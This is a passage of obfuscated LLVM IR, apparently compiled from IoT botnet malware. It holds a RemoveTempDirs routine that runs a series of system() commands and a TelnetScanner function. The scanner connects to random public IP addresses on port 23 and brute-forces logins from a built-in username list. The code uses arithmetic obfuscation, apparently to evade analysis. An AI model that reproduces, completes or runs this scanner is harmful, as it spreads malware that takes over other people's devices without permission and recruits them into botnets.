; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.488, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.489, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.490, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.491, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.492, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.493, i32 0, i32 0))
  %7 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.494, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.495, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.496, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.497, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.498, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.499, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.500, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [80 x i8], align 16
  %24 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %25 = call i32 @getdtablesize() #5
  %26 = sub i32 %25, -2032737465
  %27 = sub i32 %26, 100
  %28 = add i32 %27, -2032737465
  %29 = sub nsw i32 %25, 100
  store i32 %28, i32* %5, align 4
  %30 = load i32, i32* %5, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp sgt i32 %30, %31
  br i1 %32, label %33, label %35

; <label>:33:                                     ; preds = %2
  %34 = load i32, i32* %4, align 4
  store i32 %34, i32* %5, align 4
  br label %35

; <label>:35:                                     ; preds = %33, %2
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = call zeroext i16 @htons(i16 zeroext 23) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = call noalias i8* @malloc(i64 1025) #5
  store i8* %41, i8** %17, align 8
  %42 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 1025, i32 1, i1 false)
  %43 = load i32, i32* %5, align 4
  %44 = zext i32 %43 to i64
  %45 = call i8* @llvm.stacksave()
  store i8* %45, i8** %19, align 8
  %46 = alloca %struct.telstate_t, i64 %44, align 16
  %47 = bitcast %struct.telstate_t* %46 to i8*
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = mul i64 %49, 5
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 %50, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  br label %51

; <label>:51:                                     ; preds = %69, %35
  %52 = load i32, i32* %6, align 4
  %53 = load i32, i32* %5, align 4
  %54 = icmp slt i32 %52, %53
  br i1 %54, label %55, label %75

; <label>:55:                                     ; preds = %51
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %57
  %59 = bitcast %struct.telstate_t* %58 to i8*
  call void @llvm.memset.p0i8.i64(i8* %59, i8 0, i64 32, i32 16, i1 false)
  %60 = load i32, i32* %6, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %61
  %63 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %62, i32 0, i32 3
  store i8 1, i8* %63, align 1
  %64 = load i8*, i8** %17, align 8
  %65 = load i32, i32* %6, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %66
  %68 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %67, i32 0, i32 9
  store i8* %64, i8** %68, align 8
  br label %69

; <label>:69:                                     ; preds = %55
  %70 = load i32, i32* %6, align 4
  %71 = sub i32 %70, 947505434
  %72 = add i32 %71, 1
  %73 = add i32 %72, 947505434
  %74 = add nsw i32 %70, 1
  store i32 %73, i32* %6, align 4
  br label %51

; <label>:75:                                     ; preds = %51
  br label %76

; <label>:76:                                     ; preds = %955, %75
  br label %77

; <label>:77:                                     ; preds = %76
  store i32 0, i32* %6, align 4
  br label %78

; <label>:78:                                     ; preds = %949, %77
  %79 = load i32, i32* %6, align 4
  %80 = load i32, i32* %5, align 4
  %81 = icmp slt i32 %79, %80
  br i1 %81, label %82, label %955

; <label>:82:                                     ; preds = %78
  %83 = load i32, i32* %6, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %84
  %86 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %85, i32 0, i32 7
  %87 = load i32, i32* %86, align 16
  %88 = icmp eq i32 %87, 0
  br i1 %88, label %89, label %96

; <label>:89:                                     ; preds = %82
  %90 = call i64 @time(i64* null) #5
  %91 = trunc i64 %90 to i32
  %92 = load i32, i32* %6, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %93
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %94, i32 0, i32 7
  store i32 %91, i32* %95, align 16
  br label %96

; <label>:96:                                     ; preds = %89, %82
  %97 = load i32, i32* %6, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %98
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %99, i32 0, i32 2
  %101 = load i8, i8* %100, align 8
  %102 = zext i8 %101 to i32
  switch i32 %102, label %948 [
    i32 0, label %103
    i32 1, label %261
    i32 2, label %392
    i32 3, label %447
    i32 4, label %492
    i32 5, label %547
    i32 6, label %592
    i32 7, label %695
    i32 8, label %777
  ]

; <label>:103:                                    ; preds = %96
  %104 = load i32, i32* %6, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %105
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %106, i32 0, i32 3
  %108 = load i8, i8* %107, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp eq i32 %109, 1
  br i1 %110, label %111, label %131

; <label>:111:                                    ; preds = %103
  %112 = load i32, i32* %6, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %113
  %115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %114, i32 0, i32 9
  %116 = load i8*, i8** %115, align 8
  store i8* %116, i8** %20, align 8
  %117 = load i32, i32* %6, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %118
  %120 = bitcast %struct.telstate_t* %119 to i8*
  call void @llvm.memset.p0i8.i64(i8* %120, i8 0, i64 32, i32 16, i1 false)
  %121 = load i8*, i8** %20, align 8
  %122 = load i32, i32* %6, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %123
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %124, i32 0, i32 9
  store i8* %121, i8** %125, align 8
  %126 = call i32 @getRandomPublicIP()
  %127 = load i32, i32* %6, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %128
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %129, i32 0, i32 1
  store i32 %126, i32* %130, align 4
  br label %186

; <label>:131:                                    ; preds = %103
  %132 = load i32, i32* %6, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %133
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %134, i32 0, i32 3
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 0
  br i1 %138, label %139, label %185

; <label>:139:                                    ; preds = %131
  %140 = load i32, i32* %6, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %141
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %142, i32 0, i32 4
  %144 = load i8, i8* %143, align 2
  %145 = add i8 %144, 51
  %146 = add i8 %145, 1
  %147 = sub i8 %146, 51
  %148 = add i8 %144, 1
  store i8 %147, i8* %143, align 2
  %149 = load i32, i32* %6, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %150
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %151, i32 0, i32 5
  %153 = load i8, i8* %152, align 1
  %154 = sub i8 0, %153
  %155 = sub i8 0, 1
  %156 = add i8 %154, %155
  %157 = sub i8 0, %156
  %158 = add i8 %153, 1
  store i8 %157, i8* %152, align 1
  %159 = load i32, i32* %6, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %160
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %161, i32 0, i32 5
  %163 = load i8, i8* %162, align 1
  %164 = zext i8 %163 to i64
  %165 = icmp eq i64 %164, 35
  br i1 %165, label %166, label %171

; <label>:166:                                    ; preds = %139
  %167 = load i32, i32* %6, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %168
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %169, i32 0, i32 3
  store i8 1, i8* %170, align 1
  br label %949

; <label>:171:                                    ; preds = %139
  %172 = load i32, i32* %6, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %173
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %174, i32 0, i32 4
  %176 = load i8, i8* %175, align 2
  %177 = zext i8 %176 to i64
  %178 = icmp eq i64 %177, 35
  br i1 %178, label %179, label %184

; <label>:179:                                    ; preds = %171
  %180 = load i32, i32* %6, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 3
  store i8 1, i8* %183, align 1
  br label %949

; <label>:184:                                    ; preds = %171
  br label %185

; <label>:185:                                    ; preds = %184, %131
  br label %186

; <label>:186:                                    ; preds = %185, %111
  %187 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %187, align 4
  %188 = call zeroext i16 @htons(i16 zeroext 23) #10
  %189 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %188, i16* %189, align 2
  %190 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %191 = getelementptr inbounds [8 x i8], [8 x i8]* %190, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %191, i8 0, i64 8, i32 4, i1 false)
  %192 = load i32, i32* %6, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %193
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %194, i32 0, i32 1
  %196 = load i32, i32* %195, align 4
  %197 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %198 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %197, i32 0, i32 0
  store i32 %196, i32* %198, align 4
  %199 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %200 = load i32, i32* %6, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %202, i32 0, i32 0
  store i32 %199, i32* %203, align 16
  %204 = load i32, i32* %6, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %205
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %206, i32 0, i32 0
  %208 = load i32, i32* %207, align 16
  %209 = icmp eq i32 %208, -1
  br i1 %209, label %210, label %211

; <label>:210:                                    ; preds = %186
  br label %949

; <label>:211:                                    ; preds = %186
  %212 = load i32, i32* %6, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %213
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 16
  %217 = load i32, i32* %6, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %218
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %219, i32 0, i32 0
  %221 = load i32, i32* %220, align 16
  %222 = call i32 (i32, i32, ...) @fcntl(i32 %221, i32 3, i8* null)
  %223 = xor i32 %222, -1
  %224 = xor i32 2048, -1
  %225 = xor i32 -729582459, -1
  %226 = and i32 %223, -729582459
  %227 = and i32 %222, %225
  %228 = and i32 %224, -729582459
  %229 = and i32 2048, %225
  %230 = or i32 %226, %227
  %231 = or i32 %228, %229
  %232 = xor i32 %230, %231
  %233 = or i32 %223, %224
  %234 = xor i32 %233, -1
  %235 = or i32 -729582459, %225
  %236 = and i32 %234, %235
  %237 = or i32 %232, %236
  %238 = or i32 %222, 2048
  %239 = call i32 (i32, i32, ...) @fcntl(i32 %216, i32 4, i32 %237)
  %240 = load i32, i32* %6, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %241
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %242, i32 0, i32 0
  %244 = load i32, i32* %243, align 16
  %245 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %246 = call i32 @connect(i32 %244, %struct.sockaddr* %245, i32 16)
  %247 = icmp eq i32 %246, -1
  br i1 %247, label %248, label %256

; <label>:248:                                    ; preds = %211
  %249 = call i32* @__errno_location() #10
  %250 = load i32, i32* %249, align 4
  %251 = icmp ne i32 %250, 115
  br i1 %251, label %252, label %256

; <label>:252:                                    ; preds = %248
  %253 = load i32, i32* %6, align 4
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %254
  call void @reset_telstate(%struct.telstate_t* %255)
  br label %260

; <label>:256:                                    ; preds = %248, %211
  %257 = load i32, i32* %6, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %258
  call void @advance_telstate(%struct.telstate_t* %259, i32 1)
  br label %260

; <label>:260:                                    ; preds = %256, %252
  br label %948

; <label>:261:                                    ; preds = %96
  br label %262

; <label>:262:                                    ; preds = %261
  %263 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %264 = getelementptr inbounds [16 x i64], [16 x i64]* %263, i64 0, i64 0
  %265 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %264) #5, !srcloc !5
  %266 = extractvalue { i64, i64* } %265, 0
  %267 = extractvalue { i64, i64* } %265, 1
  %268 = trunc i64 %266 to i32
  store i32 %268, i32* %21, align 4
  %269 = ptrtoint i64* %267 to i64
  %270 = trunc i64 %269 to i32
  store i32 %270, i32* %22, align 4
  br label %271

; <label>:271:                                    ; preds = %262
  br label %272

; <label>:272:                                    ; preds = %271
  %273 = load i32, i32* %6, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %274
  %276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %275, i32 0, i32 0
  %277 = load i32, i32* %276, align 16
  %278 = srem i32 %277, 64
  %279 = zext i32 %278 to i64
  %280 = shl i64 1, %279
  %281 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %282 = load i32, i32* %6, align 4
  %283 = sext i32 %282 to i64
  %284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %283
  %285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %284, i32 0, i32 0
  %286 = load i32, i32* %285, align 16
  %287 = sdiv i32 %286, 64
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds [16 x i64], [16 x i64]* %281, i64 0, i64 %288
  %290 = load i64, i64* %289, align 8
  %291 = xor i64 %290, -1
  %292 = xor i64 %280, -1
  %293 = xor i64 7198703389307239702, -1
  %294 = and i64 %291, 7198703389307239702
  %295 = and i64 %290, %293
  %296 = and i64 %292, 7198703389307239702
  %297 = and i64 %280, %293
  %298 = or i64 %294, %295
  %299 = or i64 %296, %297
  %300 = xor i64 %298, %299
  %301 = or i64 %291, %292
  %302 = xor i64 %301, -1
  %303 = or i64 7198703389307239702, %293
  %304 = and i64 %302, %303
  %305 = or i64 %300, %304
  %306 = or i64 %290, %280
  store i64 %305, i64* %289, align 8
  %307 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %307, align 8
  %308 = load i32, i32* %3, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %309, i64* %310, align 8
  %311 = load i32, i32* %6, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %312
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %313, i32 0, i32 0
  %315 = load i32, i32* %314, align 16
  %316 = sub i32 %315, 1188197120
  %317 = add i32 %316, 1
  %318 = add i32 %317, 1188197120
  %319 = add nsw i32 %315, 1
  %320 = call i32 @select(i32 %318, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %320, i32* %7, align 4
  %321 = load i32, i32* %7, align 4
  %322 = icmp eq i32 %321, 1
  br i1 %322, label %323, label %366

; <label>:323:                                    ; preds = %272
  %324 = load i32, i32* %6, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %325
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %326, i32 0, i32 7
  store i32 0, i32* %327, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %328 = load i32, i32* %6, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %329
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %330, i32 0, i32 0
  %332 = load i32, i32* %331, align 16
  %333 = bitcast i32* %15 to i8*
  %334 = call i32 @getsockopt(i32 %332, i32 1, i32 4, i8* %333, i32* %14) #5
  %335 = load i32, i32* %15, align 4
  %336 = icmp ne i32 %335, 0
  br i1 %336, label %337, label %341

; <label>:337:                                    ; preds = %323
  %338 = load i32, i32* %6, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %339
  call void @reset_telstate(%struct.telstate_t* %340)
  br label %365

; <label>:341:                                    ; preds = %323
  %342 = load i32, i32* %6, align 4
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %343
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %344, i32 0, i32 0
  %346 = load i32, i32* %345, align 16
  %347 = load i32, i32* %6, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %348
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %349, i32 0, i32 0
  %351 = load i32, i32* %350, align 16
  %352 = call i32 (i32, i32, ...) @fcntl(i32 %351, i32 3, i8* null)
  %353 = xor i32 %352, -1
  %354 = xor i32 -2049, -1
  %355 = xor i32 -188802896, -1
  %356 = or i32 %353, %354
  %357 = or i32 -188802896, %355
  %358 = xor i32 %356, -1
  %359 = and i32 %358, %357
  %360 = and i32 %352, -2049
  %361 = call i32 (i32, i32, ...) @fcntl(i32 %346, i32 4, i32 %359)
  %362 = load i32, i32* %6, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %363
  call void @advance_telstate(%struct.telstate_t* %364, i32 2)
  br label %365

; <label>:365:                                    ; preds = %341, %337
  br label %949

; <label>:366:                                    ; preds = %272
  %367 = load i32, i32* %7, align 4
  %368 = icmp eq i32 %367, -1
  br i1 %368, label %369, label %373

; <label>:369:                                    ; preds = %366
  %370 = load i32, i32* %6, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %371
  call void @reset_telstate(%struct.telstate_t* %372)
  br label %949

; <label>:373:                                    ; preds = %366
  br label %374

; <label>:374:                                    ; preds = %373
  %375 = load i32, i32* %6, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %376
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %377, i32 0, i32 7
  %379 = load i32, i32* %378, align 16
  %380 = add i32 %379, 1418770070
  %381 = add i32 %380, 7
  %382 = sub i32 %381, 1418770070
  %383 = add i32 %379, 7
  %384 = zext i32 %382 to i64
  %385 = call i64 @time(i64* null) #5
  %386 = icmp slt i64 %384, %385
  br i1 %386, label %387, label %391

; <label>:387:                                    ; preds = %374
  %388 = load i32, i32* %6, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %389
  call void @reset_telstate(%struct.telstate_t* %390)
  br label %391

; <label>:391:                                    ; preds = %387, %374
  br label %948

; <label>:392:                                    ; preds = %96
  %393 = load i32, i32* %6, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %394
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %395, i32 0, i32 0
  %397 = load i32, i32* %396, align 16
  %398 = load i32, i32* %3, align 4
  %399 = load i32, i32* %6, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %400
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %401, i32 0, i32 9
  %403 = load i8*, i8** %402, align 8
  %404 = call i32 @read_until_response(i32 %397, i32 %398, i8* %403, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %405 = icmp ne i32 %404, 0
  br i1 %405, label %406, label %429

; <label>:406:                                    ; preds = %392
  %407 = call i64 @time(i64* null) #5
  %408 = trunc i64 %407 to i32
  %409 = load i32, i32* %6, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %410
  %412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %411, i32 0, i32 7
  store i32 %408, i32* %412, align 16
  %413 = load i32, i32* %6, align 4
  %414 = sext i32 %413 to i64
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %414
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %415, i32 0, i32 9
  %417 = load i8*, i8** %416, align 8
  %418 = call i32 @contains_fail(i8* %417)
  %419 = icmp ne i32 %418, 0
  br i1 %419, label %420, label %424

; <label>:420:                                    ; preds = %406
  %421 = load i32, i32* %6, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %422
  call void @advance_telstate(%struct.telstate_t* %423, i32 0)
  br label %428

; <label>:424:                                    ; preds = %406
  %425 = load i32, i32* %6, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %426
  call void @advance_telstate(%struct.telstate_t* %427, i32 3)
  br label %428

; <label>:428:                                    ; preds = %424, %420
  br label %949

; <label>:429:                                    ; preds = %392
  %430 = load i32, i32* %6, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %431
  %433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %432, i32 0, i32 7
  %434 = load i32, i32* %433, align 16
  %435 = sub i32 %434, -1254060650
  %436 = add i32 %435, 7
  %437 = add i32 %436, -1254060650
  %438 = add i32 %434, 7
  %439 = zext i32 %437 to i64
  %440 = call i64 @time(i64* null) #5
  %441 = icmp slt i64 %439, %440
  br i1 %441, label %442, label %446

; <label>:442:                                    ; preds = %429
  %443 = load i32, i32* %6, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %444
  call void @reset_telstate(%struct.telstate_t* %445)
  br label %446

; <label>:446:                                    ; preds = %442, %429
  br label %948

; <label>:447:                                    ; preds = %96
  %448 = load i32, i32* %6, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %449
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %450, i32 0, i32 0
  %452 = load i32, i32* %451, align 16
  %453 = load i32, i32* %6, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %454
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %455, i32 0, i32 4
  %457 = load i8, i8* %456, align 2
  %458 = zext i8 %457 to i64
  %459 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %458
  %460 = load i8*, i8** %459, align 8
  %461 = load i32, i32* %6, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %462
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %463, i32 0, i32 4
  %465 = load i8, i8* %464, align 2
  %466 = zext i8 %465 to i64
  %467 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %466
  %468 = load i8*, i8** %467, align 8
  %469 = call i64 @strlen(i8* %468) #9
  %470 = call i64 @send(i32 %452, i8* %460, i64 %469, i32 16384)
  %471 = icmp slt i64 %470, 0
  br i1 %471, label %472, label %476

; <label>:472:                                    ; preds = %447
  %473 = load i32, i32* %6, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %474
  call void @reset_telstate(%struct.telstate_t* %475)
  br label %949

; <label>:476:                                    ; preds = %447
  %477 = load i32, i32* %6, align 4
  %478 = sext i32 %477 to i64
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %478
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %479, i32 0, i32 0
  %481 = load i32, i32* %480, align 16
  %482 = call i64 @send(i32 %481, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i32 0, i32 0), i64 2, i32 16384)
  %483 = icmp slt i64 %482, 0
  br i1 %483, label %484, label %488

; <label>:484:                                    ; preds = %476
  %485 = load i32, i32* %6, align 4
  %486 = sext i32 %485 to i64
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %486
  call void @reset_telstate(%struct.telstate_t* %487)
  br label %949

; <label>:488:                                    ; preds = %476
  %489 = load i32, i32* %6, align 4
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %490
